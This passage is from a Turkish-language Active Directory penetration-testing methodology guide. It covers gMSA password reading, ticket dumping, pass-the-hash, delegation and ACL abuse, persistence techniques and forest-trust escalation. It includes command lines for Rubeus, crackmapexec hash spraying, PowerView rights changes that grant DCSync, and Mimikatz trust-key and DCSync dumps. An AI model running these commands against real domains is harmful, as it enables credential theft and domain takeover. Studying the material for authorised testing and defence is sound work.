Başarısız bir varsayılan/NTLM bind, bu bulguyu **geçersiz kılmaz**: `-k` ile, DC'ye çözümlenen bir FQDN kullanarak ve KDC ile senkronize edilmiş bir saatle test edin. Başarılı modül çalıştırmaları, aday listelerini ve edinilen ccache'leri `~/.nxc/modules/pre2k/` altında yazar.<sup>[[18]](#references)[[20]](#references)</sup>

Computer principal'ı ele geçirdikten sonra, iç içe grup üyeliklerini ve dışa dönük haklarını haritalandırın. Özellikle, bir gMSA'nın `msDS-GroupMSAMembership` güvenlik tanımlayıcısında adı geçen principal'lar `msDS-ManagedPassword` özniteliğini okuyabilir; NetExec'in `--gmsa` çıktısı, izin verilen principal'ları gösterir ve kimlik doğrulaması yapan bilgisayar yetkiliyse geçerli NT hash'i döndürür.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Ardından kurtarılan gMSA'yı diğer kimlik bilgileri gibi değerlendirin: pass-the-hash denemeden önce yerel/etki alanı grup üyeliklerini, oturum açma haklarını, SPN'leri, delegation'ı ve erişilebilir hizmetleri inceleyin. ACL tabanlı bu alma yolu, KDS root-key ihlalinden sonra yönetilen parolaları türeten [Golden gMSA/dMSA](golden-dmsa-gmsa.md) yönteminden farklıdır.<sup>[[20]](#references)</sup>

Bir bilgisayar principal'ı, diğer bilgisayar nesneleri veya gruplar üzerinde giden denetime de sahip olabilir. Böyle bir principal elde ettikten sonra iç içe üyeliklerini ve etkin ACL'lerini ayrı ayrı inceleyin: başka bir bilgisayar nesnesindeki yazma izni, hesap değişikliğini mümkün kılabilir; grup üyeliği hakları ise oturum açma rolü sağlayabilir. Aşamalı hesap bayrağı, tahmin edilebilir adlandırma kuralı veya tek başına bir `GenericWrite` bağlantısı, yolun tamamını kanıtlamaz.

Bir dosya, paylaşım veya yedeklemede `msDS-ManagedPassword` blob'unun okunabilir bir kopyasının bulunması ayrı bir sızıntı yoludur: LDAP okuma ACL'si, başka bir yerde saklanan kopyayı koruyamaz. Yorumlamadan önce verinin yönetilen parola blob'u olduğunu doğrulayın ve bunu hem yetkili bir LDAP okumasından hem de KDS root-key türetiminden ayırt edin.

### Kerberoast

Kerberoasting, kullanıcı hesaplarına bağlı hizmetlerin kullandığı **TGS biletlerini** edinmeyi ve şifrelemelerini — kullanıcı parolalarına dayalıdır — **çevrimdışı** kırmayı içerir.

Bu konuda daha fazla bilgi:


{{#ref}}
kerberoast.md
{{#endref}}

### Uzak bağlantı (RDP, SSH, FTP, Win-RM vb.)

Bazı kimlik bilgilerini elde ettikten sonra herhangi bir **makineye** erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için, port taramalarınıza uygun protokollerle birden fazla sunucuya bağlanmayı denemek üzere **CrackMapExec** kullanabilirsiniz.

### Yerel Yetki Yükseltme

Etki alanı kullanıcısı olarak kimlik bilgilerini veya bir oturumu ele geçirdiyseniz ve etki alanındaki **herhangi bir makineye** erişebiliyorsanız, **yerel olarak yetki yükseltmek ve kimlik bilgilerini toplamak** için bir yol arayın. Yerel yönetici ayrıcalıkları, bellekteki (LSASS) ve yerel depolamadaki (SAM) diğer kullanıcıların **hash'lerini dökmenizi** sağlayabilir.

Bu kitapta [**Windows'ta yerel yetki yükseltme**](../windows-local-privilege-escalation/index.html) hakkında eksiksiz bir sayfa ve bir [**kontrol listesi**](../checklist-windows-privilege-escalation.md) bulunuyor. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı unutmayın.

### Geçerli Oturum Biletleri

Geçerli kullanıcının **beklenmedik kaynaklara erişim izni veren** **biletlerine** rastlama olasılığınız çok **düşük**, ancak şunları kontrol edebilirsiniz:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Etki alanı kimlik bilgileri veya bir kullanıcı oturumuyla, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) yöntemlerini yeniden inceleyin: kimliği doğrulanmış enumeration ve coercion teknikleri, kimlik doğrulaması yapılmamış keşif sırasında kullanılamayan relay yollarını ortaya çıkarabilir.

### Bilgisayar Paylaşımlarında Creds Ara | SMB Paylaşımları

Artık bazı temel kimlik bilgilerine sahip olduğunuza göre, **AD içinde paylaşılan ilginç dosyalar bulup bulamayacağınızı** kontrol etmelisiniz. Bunu elle yapabilirsiniz, ancak bu çok sıkıcı ve tekrarlayan bir iştir (özellikle kontrol etmeniz gereken yüzlerce belge bulursanız).

[**Kullanabileceğiniz araçları öğrenmek için bu bağlantıyı izleyin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Creds Çalma

**Diğer bilgisayarlara veya paylaşımlara erişebiliyorsanız**, erişildiğinde size karşı bir NTLM kimlik doğrulamasını **tetikleyecek** SCF dosyası gibi **dosyalar yerleştirebilirsiniz**. Böylece kırmak üzere **NTLM challenge'ını çalabilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu güvenlik açığı, kimliği doğrulanmış herhangi bir kullanıcının **etki alanı denetleyicisini ele geçirmesine** olanak tanıyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Ayrıcalıklı kimlik bilgileri/oturumla Active Directory'de ayrıcalık yükseltme

**Aşağıdaki teknikler için normal bir etki alanı kullanıcısı yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel ayrıcalıklara/kimlik bilgilerine ihtiyacınız vardır.**

### Hash çıkarma

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relay içeren [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) veya [yerel olarak ayrıcalık yükseltme](../windows-local-privilege-escalation/index.html) yöntemleriyle bir yerel admin hesabını **ele geçirmeyi** başarmışsınızdır.\
Şimdi bellekteki ve yerel olarak depolanan tüm hash'leri dökmenin zamanı.\
[**Hash'leri elde etmenin farklı yolları hakkında bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ini elde ettiğinizde**, onu taklit etmek için kullanabilirsiniz.\
Bu hash'i **kullanarak** NTLM kimlik doğrulamasını **gerçekleştirecek** bir **araç** kullanmanız gerekir; **ya da** yeni bir **sessionlogon** oluşturup bu **hash'i** LSASS içine **enjekte** edebilirsiniz. Böylece herhangi bir **NTLM kimlik doğrulaması gerçekleştirildiğinde** bu **hash kullanılır.** Mimikatz'in yaptığı son seçenektir.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash yönteminin NTLM protokolü üzerinden kullanılmasına alternatif olarak, **Kerberos biletleri istemek için kullanıcının NTLM hash'ini kullanmayı** amaçlar. Bu nedenle, NTLM protokolünün devre dışı bırakıldığı ve kimlik doğrulama protokolü olarak yalnızca **Kerberos'a izin verilen** ağlarda özellikle **yararlı olabilir**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** saldırı yönteminde saldırganlar, parola veya hash değerleri yerine **kullanıcının kimlik doğrulama biletini çalar**. Ardından bu çalıntı bilet, **kullanıcıyı taklit etmek** ve ağ içindeki kaynaklara ve hizmetlere yetkisiz erişim elde etmek için kullanılır.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Kimlik Bilgilerini Yeniden Kullanma

Bir yerel admin hesabının **hash'ine** veya **parolasına** sahipseniz, bunları kullanarak diğer **bilgisayarlara yerel olarak giriş yapmayı** denemelisiniz.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS**'ın bunu **önleyebileceğini** unutmayın.

### MSSQL Abuse & Trusted Links

Bir kullanıcının **MSSQL örneklerine erişme** ayrıcalıkları varsa, MSSQL ana makinesinde (SA olarak çalışıyorsa) **komut çalıştırabilir**, NetNTLM **hash**'ini **çalabilir** ve hatta bir **relay** **attack** gerçekleştirebilir.\
Bir MSSQL örneğine başka bir örnek veritabanı bağlantısı üzerinden güveniliyorsa, bağlı veritabanında ayrıcalıkları olan bir kullanıcı **güven ilişkisini kullanarak diğer örnekte sorgular çalıştırabilir**. Bu güven ilişkileri zincirlenebilir ve sonunda kullanıcının komut çalıştırabileceği yanlış yapılandırılmış bir veritabanına ulaşabilir.\
**Veritabanları arasındaki bağlantılar forest trust'ları arasında da çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### BT varlık/envanter platformlarının kötüye kullanılması

Üçüncü taraf envanter ve dağıtım paketleri, genellikle kimlik bilgilerine ve kod yürütmeye erişim sağlayan güçlü yollar sunar. Bkz.:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) özniteliğine sahip bir Computer nesnesi bulursanız ve bilgisayarda domain ayrıcalıklarınız varsa, bilgisayarda oturum açan tüm kullanıcıların TGT'lerini bellekten dökebilirsiniz.\
Dolayısıyla, bir **Domain Admin bilgisayarda oturum açarsa**, onun TGT'sini dökebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onun kimliğine bürünebilirsiniz.\
Constrained delegation sayesinde bir **Print Server'ı otomatik olarak ele geçirebilirsiniz** (umarız bu bir DC olur).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Bir kullanıcı veya bilgisayar "Constrained Delegation" için yetkilendirilmişse, **bir bilgisayardaki belirli hizmetlere erişmek için herhangi bir kullanıcının kimliğine bürünebilir**.\
Ardından, bu kullanıcının/bilgisayarın **hash'ini ele geçirirseniz**, bazı hizmetlere erişmek için **herhangi bir kullanıcının** (domain admin'ler dahil) **kimliğine bürünebilirsiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir bilgisayarın Active Directory nesnesi üzerinde **WRITE** ayrıcalığına sahip olmak, **yükseltilmiş ayrıcalıklarla** kod yürütmeyi mümkün kılar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### İzinlerin/ACL'lerin kötüye kullanılması

Ele geçirilmiş kullanıcı, bazı domain nesneleri üzerinde **ilginç ayrıcalıklara** sahip olabilir; bunlar daha sonra yanal olarak **ilerlemenizi**/**ayrıcalık yükseltmenizi** sağlayabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler hizmetinin kötüye kullanılması

Domain içinde **dinleyen bir Spool hizmeti** keşfetmek, **yeni kimlik bilgileri edinmek** ve **ayrıcalıkları yükseltmek** için kullanılabilir.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Üçüncü taraf oturumlarının kötüye kullanılması

**Diğer kullanıcılar** **ele geçirilmiş** makineye **erişirse**, **bellekten kimlik bilgileri toplamak** ve hatta kimliklerine bürünmek için süreçlerine **beacon enjekte etmek** mümkündür.\
Kullanıcılar genellikle sisteme RDP üzerinden erişir. Bu nedenle, üçüncü taraf RDP oturumlarına yönelik birkaç attack gerçekleştirme yöntemi şunlardır:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e katılmış bilgisayarlardaki **local Administrator parolasını** yönetmek için bir sistem sunar; parola **rastgele**, benzersiz ve sık sık **değiştirilen** bir parola olur. Bu parolalar Active Directory'de saklanır ve erişim, ACL'ler aracılığıyla yalnızca yetkili kullanıcılarla sınırlandırılır. Bu parolalara erişmek için yeterli izne sahip olmak, diğer bilgisayarlara pivot etmeyi mümkün kılar.


{{#ref}}
laps.md
{{#endref}}

### Sertifika hırsızlığı

Ele geçirilmiş makineden **sertifika toplamak**, ortam içinde ayrıcalıkları yükseltmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Sertifika şablonlarının kötüye kullanılması

**Güvenlik açığı bulunan şablonlar** yapılandırılmışsa, ayrıcalıkları yükseltmek için bunlardan yararlanmak mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Yüksek ayrıcalıklı hesapla Post-exploitation

### Domain kimlik bilgilerinin dökülmesi

**Domain Admin** veya daha iyisi **Enterprise Admin** ayrıcalıkları edindiğinizde, **domain veritabanını** dökebilirsiniz: _ntds.dit_.

[DCSync attack hakkında daha fazla bilgiye buradan ulaşabilirsiniz](dcsync.md).

[NTDS.dit dosyasının nasıl çalınacağı hakkında daha fazla bilgiye buradan ulaşabilirsiniz](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit` dosyasını `SYSTEM` hive ile birlikte içeren, okunabilir bir yedek arşivi, içerik çıkarılmadan önce bile açığa çıkmış dizin materyali olarak değerlendirilmelidir. Eski bir parola hash'i, diğer nesne özniteliklerini güvenli hâle getirmez: `description` gibi alanlarda kimlik bilgileri veya operasyonel notlar bulunabilir. Önce arşiv üye adlarını inceleyin ve çıkarılan veritabanı içeriğini rutin enumeration çıktılarının dışında tutun.

### Persistence için Privesc

Daha önce ele alınan bazı teknikler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) saldırısına karşı savunmasız hâle getirmek

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Kullanıcıları [**ASREPRoast**](asreproast.md) saldırısına karşı savunmasız hale getirin.

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Bir kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları verin

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket saldırısı**, belirli bir hizmet için **NTLM hash**'ini (örneğin, **bilgisayar hesabının hash'ini**) kullanarak **geçerli bir Ticket Granting Service (TGS) bileti** oluşturur. Bu yöntem, **hizmet ayrıcalıklarına erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket saldırısı**, saldırganın bir Active Directory (AD) ortamındaki **krbtgt hesabının NTLM hash'ine** erişmesini içerir. Bu hesap özeldir; çünkü AD ağında kimlik doğrulaması için gerekli olan tüm **Ticket Granting Ticket'ları (TGT'ler)** imzalamak için kullanılır.

Saldırgan bu hash'i ele geçirdiğinde, istediği herhangi bir hesap için **TGT'ler** oluşturabilir (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın Golden Ticket tespit mekanizmalarını atlayacak şekilde** sahte olarak oluşturulan Golden Ticket'lara benzer.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Bir hesabın **sertifikalarına sahip olmak veya bunları talep edebilmek**, kullanıcı hesabında kalıcılık sağlamak için çok iyi bir yöntemdir (kullanıcı parolasını değiştirse bile):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Sertifikalar kullanarak** etki alanında yüksek ayrıcalıklarla kalıcılık sağlamak da mümkündür:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** nesnesi, yetkisiz değişiklikleri önlemek için **ayrıcalıklı gruplara** (Domain Admins ve Enterprise Admins gibi) standart bir **Access Control List (ACL)** uygulayarak bu grupların güvenliğini sağlar. Ancak bu özellik kötüye kullanılabilir: Saldırgan, normal bir kullanıcıya tam erişim vermek için AdminSDHolder'ın ACL'sini değiştirirse, bu kullanıcı tüm ayrıcalıklı gruplar üzerinde geniş denetim elde eder. Böylece koruma amacı taşıyan bu güvenlik önlemi, yakından izlenmediğinde istenmeyen erişime yol açabilir.

[**AdminDSHolder Group hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **yerel yönetici** hesabı bulunur. Böyle bir makinede yönetici hakları elde edildiğinde, yerel Administrator hash'i **mimikatz** kullanılarak çıkarılabilir. Ardından, **bu parolanın kullanımını etkinleştirmek** için bir kayıt defteri değişikliği gerekir; böylece yerel Administrator hesabına uzaktan erişilebilir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Bir **kullanıcıya**, gelecekte **ayrıcalıklarını yükseltmesini** sağlayacak belirli etki alanı nesneleri üzerinde bazı **özel izinler** verebilirsiniz.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor'lar**, bir **nesnenin** başka bir **nesne üzerindeki** **izinlerini** **saklamak** için kullanılır. Bir nesnenin **security descriptor'ında** yalnızca **küçük bir değişiklik** yapabilirseniz, ayrıcalıklı bir grubun üyesi olmanız gerekmeden bu nesne üzerinde oldukça ilginç ayrıcalıklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` yardımcı sınıfını kötüye kullanarak `entryTTL`/`msDS-Entry-Time-To-Die` ile kısa ömürlü principal'lar/GPO'lar/DNS kayıtları oluşturun. Bunlar tombstone bırakmadan kendilerini siler; LDAP kanıtlarını ortadan kaldırırken geride yetim SID'ler, bozuk `gPLink` referansları veya önbelleğe alınmış DNS yanıtları bırakır (ör. AdminSDHolder ACE kirliliği ya da kötü amaçlı `gPCFileSysPath`/AD tümleşik DNS yönlendirmeleri).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Tüm etki alanı hesaplarına erişim sağlayan **evrensel bir parola** belirlemek için bellekteki **LSASS**'i değiştirin.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Makineye erişmek için kullanılan **kimlik bilgilerini** **açık metin olarak yakalamak** üzere **kendi SSP'nizi** oluşturabilirsiniz.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD'de **yeni bir Domain Controller** kaydeder ve belirtilen nesnelerdeki öznitelikleri (SIDHistory, SPN'ler...) **değişikliklerle ilgili herhangi bir günlük bırakmadan** göndermek için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış veri kullanırsanız oldukça çirkin günlüklerin oluşacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce, **LAPS parolalarını okuyacak yeterli izniniz** olduğunda ayrıcalıkların nasıl yükseltileceğini ele almıştık. Ancak bu parolalar **kalıcılığı sürdürmek** için de kullanılabilir.\
Şuraya bakın:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı güvenlik sınırı olarak görür. Bu, **tek bir etki alanının ele geçirilmesinin tüm Forest'ın ele geçirilmesine yol açabileceği** anlamına gelir.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **etki alanındaki** kullanıcının başka bir **etki alanındaki** kaynaklara erişmesini sağlayan bir güvenlik mekanizmasıdır. Temelde, iki etki alanının kimlik doğrulama sistemleri arasında bağlantı kurarak kimlik doğrulama doğrulamalarının sorunsuz biçimde gerçekleşmesini sağlar. Etki alanları bir trust oluşturduğunda, trust'ın bütünlüğü açısından kritik olan belirli **anahtarları** kendi **Domain Controller'larında (DC'lerde)** değiş tokuş eder ve saklarlar.

Tipik bir senaryoda, kullanıcı **trusted domain** içindeki bir hizmete erişmek istiyorsa önce kendi etki alanının DC'sinden **inter-realm TGT** olarak bilinen özel bir bilet talep etmelidir. Bu TGT, her iki etki alanının da üzerinde anlaştığı ortak bir **anahtarla** şifrelenir. Kullanıcı daha sonra hizmet bileti (**TGS**) almak için bu TGT'yi **trusted domain'in DC'sine** sunar. Trusted domain'in DC'si inter-realm TGT'yi başarıyla doğruladığında, kullanıcıya hizmete erişim izni veren bir TGS düzenler.

**Adımlar**:

1. **Domain 1**'deki bir **istemci bilgisayar**, **NTLM hash**'ini kullanarak **Domain Controller'ından (DC1)** bir **Ticket Granting Ticket (TGT)** talep ederek süreci başlatır.
2. İstemcinin kimliği başarıyla doğrulanırsa DC1 yeni bir TGT düzenler.
3. Ardından istemci, **Domain 2**'deki kaynaklara erişmek için gereken bir **inter-realm TGT**'yi DC1'den talep eder.
4. Inter-realm TGT, iki yönlü etki alanı trust'ının parçası olarak DC1 ile DC2 arasında paylaşılan bir **trust key** ile şifrelenir.
5. İstemci, inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, paylaşılan trust key'i kullanarak inter-realm TGT'yi doğrular ve bilet geçerliyse istemcinin erişmek istediği Domain 2 sunucusu için bir **Ticket Granting Service (TGS)** düzenler.
7. Son olarak istemci, Domain 2'deki hizmete erişmek için bu TGS'yi sunucuya sunar. TGS, sunucunun hesap hash'iyle şifrelenmiştir.

### Different trusts

Bir trust'ın **tek yönlü veya iki yönlü olabileceğini** unutmamak önemlidir. İki yönlü seçeneklerde her iki etki alanı da birbirine güvenir; **tek yönlü** trust ilişkisinde ise etki alanlarından biri **trusted**, diğeri **trusting** olur. İkinci durumda, yalnızca trusted etki alanından trusting etki alanındaki kaynaklara erişebilirsiniz.

Domain A, Domain B'ye güveniyorsa A, trusting domain; B ise trusted domain'dir. Ayrıca **Domain A** açısından bu bir **Outbound trust**; **Domain B** açısından ise bir **Inbound trust** olur.

**Farklı trust ilişkileri**

- **Parent-Child Trusts**: Aynı Forest içindeki yaygın bir kurulumdur; child domain, parent domain'iyle otomatik olarak iki yönlü ve geçişli bir trust oluşturur. Temelde bu, kimlik doğrulama isteklerinin parent ve child arasında sorunsuz biçimde aktarılabileceği anlamına gelir.
- **Cross-link Trusts**: "Shortcut trusts" olarak da bilinir ve yönlendirme süreçlerini hızlandırmak için child domain'ler arasında kurulur. Karmaşık Forest'larda kimlik doğrulama yönlendirmeleri genellikle Forest root'a kadar çıkıp ardından hedef etki alanına iner. Cross-link'ler oluşturarak bu yol kısaltılır; bu, özellikle coğrafi olarak dağınık ortamlarda faydalıdır.
- **External Trusts**: Farklı ve birbiriyle ilişkili olmayan etki alanları arasında kurulur ve doğaları gereği geçişli değildir. [Microsoft'un belgelerine](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre external trust'lar, Forest trust'ıyla bağlı olmayan geçerli Forest dışındaki bir etki alanındaki kaynaklara erişmek için kullanışlıdır. External trust'larda SID filtering güvenliği artırır.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak kurulur. Yaygın olmasa da, yeni etki alanı ağaçlarının bir Forest'a eklenmesi açısından önemlidir; bu ağaçların benzersiz bir etki alanı adını korumasını ve iki yönlü geçişliliği sağlar. Daha fazla bilgiye [Microsoft'un kılavuzundan](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) ulaşabilirsiniz.
- **Forest Trusts**: İki Forest root domain arasında kurulan, SID filtering'i de güvenlik önlemlerini güçlendirmek için zorunlu kılan iki yönlü ve geçişli bir trust türüdür.
- **MIT Trusts**: Windows dışındaki, [RFC4120 uyumlu](https://tools.ietf.org/html/rfc4120) Kerberos etki alanlarıyla kurulur. MIT trust'lar daha özelleşmiştir ve Windows ekosistemi dışındaki Kerberos tabanlı sistemlerle tümleştirme gerektiren ortamlar için uygundur.

#### **Trust ilişkilerindeki diğer farklar**

- Bir trust ilişkisi **geçişli** (A, B'ye güvenir; B, C'ye güvenir; o hâlde A, C'ye güvenir) veya **geçişli olmayan** olabilir.
- Bir trust ilişkisi **çift yönlü trust** (taraflar birbirine güvenir) ya da **tek yönlü trust** (taraflardan yalnızca biri diğerine güvenir) olarak kurulabilir.

### Attack Path

1. Trust ilişkilerini **enumerate** edin.
2. Herhangi bir **security principal**'ın (kullanıcı/grup/bilgisayar) diğer **etki alanının** kaynaklarına **erişimi** olup olmadığını kontrol edin; örneğin ACE girdileri aracılığıyla veya diğer etki alanının gruplarında yer almasıyla. **Etki alanları arasındaki ilişkileri** arayın (muhtemelen trust bu amaçla oluşturulmuştur).
   1. Bu durumda kerberoast başka bir seçenek olabilir.
3. Etki alanları arasında **pivot** yapabilen **hesapları** **ele geçirin**.

Diğer bir etki alanındaki kaynaklara erişebilen saldırganlar bunu üç temel mekanizma aracılığıyla yapabilir:

- **Local Group Membership**: Principal'lar makinede geniş denetim sağlayan sunucudaki “Administrators” grubu gibi yerel gruplara eklenmiş olabilir.
- **Foreign Domain Group Membership**: Principal'lar yabancı etki alanındaki grupların da üyeleri olabilir. Ancak bu yöntemin etkililiği trust'ın niteliğine ve grubun kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar bir **ACL** içinde, özellikle de bir **DACL** içindeki **ACE**'lerde varlık olarak belirtilerek belirli kaynaklara erişim kazanabilir. ACL'lerin, DACL'lerin ve ACE'lerin işleyişini daha ayrıntılı incelemek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı teknik makale değerli bir kaynaktır.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Etki alanındaki yabancı security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** konumunu kontrol edebilirsiniz. Bunlar **harici bir etki alanından/Forest'tan** gelen kullanıcılar/gruplardır.

Bunu **Bloodhound** ile veya powerview kullanarak kontrol edebilirsiniz:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest ayrıcalık yükseltme

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Etki alanı güven ilişkilerini numaralandırmanın diğer yolları:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **2 güvenilir anahtar** vardır: biri _Child --> Parent_, diğeri _Parent_ --> _Child_ için.\
> Mevcut etki alanının kullandığı anahtarı şu komutla bulabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection kullanarak trust ilişkisini kötüye kullanıp child/parent domain'de Enterprise admin yetkilerine yükselin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Yazılabilir Configuration NC'yi Exploit Etme

Configuration Naming Context'in (NC) nasıl exploit edilebileceğini anlamak çok önemlidir. Configuration NC, Active Directory (AD) ortamlarındaki forest genelinde yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest içindeki her Domain Controller'a (DC) replike edilir; yazılabilir DC'ler ise Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu exploit etmek için bir DC'de, tercihen bir child DC'de **SYSTEM yetkilerine** sahip olmak gerekir.

**GPO'yu root DC sitesine bağlama**

Configuration NC'nin Sites container'ı, AD forest içindeki domain'e katılmış tüm bilgisayarların siteleri hakkında bilgi içerir. Herhangi bir DC'de SYSTEM yetkileriyle çalışan saldırganlar, GPO'ları root DC sitelerine bağlayabilir. Bu işlem, bu sitelere uygulanan politikaları değiştirerek root domain'i potansiyel olarak ele geçirmeyi sağlar.

Ayrıntılı bilgi için [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) araştırmasını inceleyebilirsiniz.<sup>[[12]](#references)</sup>

**Forest'taki herhangi bir gMSA'yı ele geçirme**

Bir saldırı vektörü, domain içindeki ayrıcalıklı gMSA'ları hedeflemektir. gMSA parolalarını hesaplamak için gereken KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC'de SYSTEM yetkileriyle KDS Root key'e erişmek ve forest genelindeki herhangi bir gMSA'nın parolasını hesaplamak mümkündür.

Ayrıntılı analiz ve adım adım yönergeler için:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

